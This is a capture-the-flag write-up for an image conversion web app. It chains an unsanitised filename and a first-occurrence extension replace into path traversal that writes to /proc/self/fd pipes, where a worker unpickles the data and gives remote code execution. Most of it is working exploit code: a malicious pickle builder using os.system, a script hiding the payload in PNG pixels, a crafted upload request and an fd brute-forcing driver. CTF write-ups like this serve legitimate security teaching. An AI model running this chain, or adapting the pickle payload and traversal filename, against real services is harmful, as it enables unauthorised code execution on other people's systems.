unsafe filename handling → output path replacement bug → write converted image to /proc/<pid>/fd/<n> → crafted SGI image bytes include [len][pickle] → worker reads pipe and unpickles → RCE

The website can:
- convert images to diff formats.
- can upload several files at once
- convert and pack them to a single zip file.

```py
def safe_filename(filename):
    filneame = filename.replace("/", "_").replace("..", "_")
    return filename
```

Typo in the function; so it does not sanitize filenames — path traversal via crafted filename works.

The code replaces the first occurrence of the original extension with the output format. That allows tricks like embedding the target path inside the “extension” part so the output path resolves to an arbitrary location.
```py
def convert_image(args):
    file_data, filename, output_format, temp_dir = args
    try:
        with Image.open(io.BytesIO(file_data)) as img:
            if img.mode != "RGB":
                img = img.convert('RGB')
            filename = safe_filename(filename)
            orig_ext = filename.rsplit('.', 1)[1] if '.' in filename else None
            ext = output_format.lower()
            if orig_ext:
                out_name = filename.replace(orig_ext, ext, 1)
            else:
                out_name = f"{filename}.{ext}"
            output_path = os.path.join(temp_dir, out_name)
            with open(output_path, 'wb') as f:
                img.save(f, format=output_format)

            return output_path, out_name, None
    except Exception as e:
        return None, filename, str(e)
```

Intended behavior:
When a user uploads picture.png and you convert it to SGI, you normally want:

- Input filename: picture.png

- Replace the final extension .png → .sgi

Result: picture.sgi → saved as .../uploads/picture.sgi

So the extension replacement should operate on the filename suffix (the last .) only.

Bug: The code uses a first-occurrence replace — it replaces the first occurrence of the original extension anywhere in the filename string, not necessarily the last one.

Suppose an attacker chose the following fileame:
a.png/../../proc/self/fd/10.png
This filename contains .png twice:

first .png inside a.png

second .png at the end following the path-traversal component

What happens on replace:
```
out_name = "a.png/../../proc/self/fd/10.png".replace(".png", ".sgi", 1)
         = "a.sgi/../../proc/self/fd/10.png"

```
Then the server concatenates with upload base:
```
output_path = "/var/www/uploads/" + "a.sgi/../../proc/self/fd/10.png"
```
Filesystem normalization (path collapse of ..) yields:
```
/var/www/uploads/a.sgi/../../proc/self/fd/10.png  -->  /proc/self/fd/10.png
```

Application opens a multiprocessing tool for each request. In this case, its solution is to open a pipe file descriptor (fd) and communicate via pickle format.

We need the image generation process to produce pickle data and throw it into that pipe to get an RCE. 
Note: we can write directly to the pipes under /proc/*/fd as if they were files.
The format that pipe expects:
```
[ 4 bytes little-endian len(pickle_data) ]
[ pickle_data ]
```
The convert worker reads messages over a pipe using Python’s pickle protocol.

If the worker reads attacker bytes that form a valid pickle, the unpickling process will execute the reconstruction instructions inside the pickle. If the pickle describes something like (os.system, ('cmd',)), the worker will call os.system('cmd') during unpickle.

To solve; exploits in /IMGC0NV-exploit

steps:
1) build_pickle.py — build the pickle payload and write message.bin

Creates a pickle that executes cat /flag > /tmp/out when unpickled, prefixes with 4-byte length and writes message.bin.
```py
#build-pickle.py
import pickle
import os

class Exploit:
    def __reduce__(self):
        cmd = "cat /flag > /tmp/out"
        return (os.system, (cmd,))

def main():
    p = pickle.dumps(Exploit(), protocol=4)  
    with open("pickle_blob.bin", "wb") as f:
        f.write(p)
    lp = len(p).to_bytes(4, "little") + p
    with open("message.bin", "wb") as f:
        f.write(lp)
    print("Built pickle_blob.bin (len={} bytes) and message.bin (len={})".format(len(p), len(lp)))

if __name__ == "__main__":
    main()
```

Why this works:

`Exploit.__reduce__` returns (callable, args). When unpickled Python will call callable(*args). Here os.system("cat /flag > /tmp/out") runs on the target.

pickle_blob.bin is the raw pickle bytes; message.bin is 4-byte-len + pickle, matching the IPC framing the worker expects.

2) make_exploit_png.py — embed message.bin bytes into a PNG such that SGI output contains them early

This maps each byte into a pixel channel so Pillow conversion to SGI emits those bytes in order.
```py
# make_exploit_png.py
from PIL import Image
import sys

# layout constants (tuned as in the writeup)
WIDTH  = 65535
HEIGHT = 159
START_X = 65506
Y_POS = 3

MSG_FILE = "message.bin"
OUT_PNG = "exploit.png"

def load_msg():
    with open(MSG_FILE, "rb") as f:
        return f.read()

def make_image(msg_bytes):
    img = Image.new("RGB", (WIDTH, HEIGHT), (0,0,0))
    pixels = img.load()

    for i, b in enumerate(msg_bytes):
        pos = START_X + i
        x = pos % WIDTH
        y = Y_POS - (pos // WIDTH)
        if y < 0 or y >= HEIGHT:
            raise SystemExit("Payload too large for layout; increase HEIGHT or adjust START_X")
        # Place payload byte in the blue channel; set R,G to 255 (as used in writeup)
        pixels[x, y] = (255, 255, b)
    img.save(OUT_PNG, "PNG")
    print(f"Saved {OUT_PNG} (embedded {len(msg_bytes)} bytes)")

if __name__ == "__main__":
    msg = load_msg()
    make_image(msg)

```


3) upload_try_fd.py — upload the PNG targeting a single FD and attempt to trigger

This posts the exploit.png to /convert asking for SGI output and uses an attacker filename that should normalize to /proc/self/fd/<FD>.png after the buggy replace.
```py

# upload_try_fd.py
import requests
import sys

# USAGE: python3 upload_try_fd.py http://target/convert 10
if len(sys.argv) < 3:
    print("Usage: python3 upload_try_fd.py <TARGET_CONVERT_URL> <FD>")
    sys.exit(1)

TARGET = sys.argv[1].rstrip('/')
FD = int(sys.argv[2])

FILENAME = f'a.png/../../proc/self/fd/{FD}.png'   # crafted filename that becomes out path after replace+normalize
FILES = {'files': (FILENAME, open('exploit.png', 'rb'), 'image/png')}
DATA = {'format': 'SGI'}

print("Uploading exploit.png with filename:", FILENAME)
r = requests.post(TARGET, files=FILES, data=DATA, timeout=30)
print("HTTP", r.status_code)
print(r.text[:1000])
```

How & why

FILENAME exploits the server bug: the converter replaces the first .png with .sgi, producing a.sgi/../../proc/self/fd/FD.png; normalized that becomes /proc/self/fd/FD.png if the .. climb high enough — the converted SGI bytes get written into that path (i.e., into the pipe fd).

If the worker holds the corresponding read end, it will see the bytes and unpickle them.

4) exploit_driver.py — automate build → png → brute FDs 3..40

A single script that runs the 3 previous pieces automatically and tries FD numbers across a range. It also optionally polls for /tmp/out if you have a way to fetch it (note: in many CTFs you'll need an additional read vector; adapt accordingly).
```py
# exploit_driver.py
import subprocess
import requests
import time
import os
import sys

# Adjust the convert URL to your challenge
TARGET_CONVERT = "http://<TARGET>/convert"   # <-- REPLACE with actual convert endpoint

def run(cmd):
    print("RUN:", " ".join(cmd))
    subprocess.check_call(cmd)

def build_everything():
    run(["python3", "build_pickle.py"])
    run(["python3", "make_exploit_png.py"])

def try_fds(start=3, end=40):
    for fd in range(start, end+1):
        print("Trying fd", fd)
        try:
            subprocess.run(["python3", "upload_try_fd.py", TARGET_CONVERT, str(fd)], check=True)
        except subprocess.CalledProcessError as e:
            print("upload failed for fd", fd, ":", e)
        time.sleep(0.5)

if __name__ == "__main__":
    if TARGET_CONVERT == "http://<TARGET>/convert":
        print("Please edit TARGET_CONVERT in the script before running.")
        sys.exit(1)
    build_everything()
    try_fds(3, 40)
    print("Done trying FDs. If successful, flag should be in /tmp/out on target (or a reverse shell connected).")

```
Adjustments

Edit TARGET_CONVERT to match the challenge URL (for example http://localhost:8000/convert)

How to run (ordered):

Place the four scripts in one working directory. Ensure you have python3, pip install pillow requests.

python3 build_pickle.py (creates message.bin, pickle_blob.bin)

python3 make_exploit_png.py (creates exploit.png)

Use upload_try_fd.py to test one FD:

python3 upload_try_fd.py `http://<TARGET>/convert 10`


or run exploit_driver.py after editing the TARGET_CONVERT variable to try many fds.

If exploit succeeds, the worker will unpickle and run cat /flag > /tmp/out. Retrieve /tmp/out using whatever read-vector the challenge provides (sometimes there's an HTTP endpoint to read files, sometimes you need a second exploit to expose it).
